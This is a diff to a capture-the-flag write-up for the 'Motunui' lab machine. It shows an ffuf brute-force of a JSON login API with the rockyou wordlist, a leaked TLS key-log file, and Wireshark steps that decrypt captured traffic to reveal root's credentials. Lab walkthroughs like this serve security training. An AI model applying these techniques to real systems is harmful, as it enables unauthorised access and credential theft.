@@ -618,7 +618,8 @@ xx.xxx.xxx.x d3v3lopm3nt.motunui.thm motonui.thm api.motonui.thm
 {"error":"invalid credentials"}
 ```
 
-<p align="center">maui:island</p>
+<br>
+<p align="center">Brute Forcing the JSON application<br>maui:island</p>
 
 ```bash
 :~/Motunui# ffuf -u http://api.motunui.thm:3000/v2/login -w /usr/share/wordlists/rockyou.txt -X POST -H 'Content-Type: application/json' -d '{"username":"maui","password":"FUZZ"}' -fs 31
@@ -1121,7 +1122,7 @@ app.listen(3000);
 ```
 
 <br>
-<p>/etc/ssl.txt</p>
+<p align="center"> Identified /etc/ssl.txt</p>
 
 ```bash
 moana@motunui:/var/www/api.motunui.thm$ env
@@ -1145,13 +1146,29 @@ LOGNAME=moana
 ```
 
 <br>
-<p> align="center">Saved <ins>ssl.txt</ins> content.</p>
+<p align="left">ssl.txt content</p>
 
 ```bash
 moana@motunui:/etc$ cat ssl.txt
 CLIENT_RANDOM 432738e149bdfb67ce70ca989045c1f2f75...57f38e1ed457295 ee0b4...36f5246233ed71164a9a7e017d417afa
 ...
 ```
+
+<br>
+<p>
+	
+- launch <code>wireshark</code><br>
+- open maui´s ticket <code>ticket_6746.pcapng</code><br>
+- click <code>Edit</code> > <code>Preferences...</code><br>
+- click <code>Protocols</code> > <code>TLS</code><br>
+- click <code>Browse...</code> on the <code>(Pre)-Master-Secret log filename</code> field<br>
+- choose <code>ssl.txt</code> from previous steps<br>
+- click <code>OK</code>
+- righ-click over the <code>Client Hello</code> packet<br>
+- click <code>Follow</code><br>
+- click <code>TLS Stream</code><br>
+- identify root´s credentials<br><code>root</code>:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃</code></p>
+
 
 <br>
 <br>
